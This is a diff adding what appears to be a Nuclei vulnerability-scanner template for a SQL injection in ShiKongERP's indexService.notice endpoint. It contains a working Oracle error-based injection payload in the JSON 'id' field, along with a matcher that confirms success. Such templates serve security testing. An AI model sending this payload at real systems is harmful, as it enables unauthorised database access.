@@ -1,0 +1,28 @@
+id: ShiKongERP-indexService-sqlInjection
+
+info:
+  name: ShiKongERP-indexService-sqlInjection
+  author: iSee857
+  severity: high
+  description: ShiKongERP-indexService-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /formservice?service=indexService.notice HTTP/1.1
+        Host: 
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+
+        {"id":"1' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))-- fKEk"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qzpvq1qzvvq"
+
+      - type: status
+        status:
+          - 200
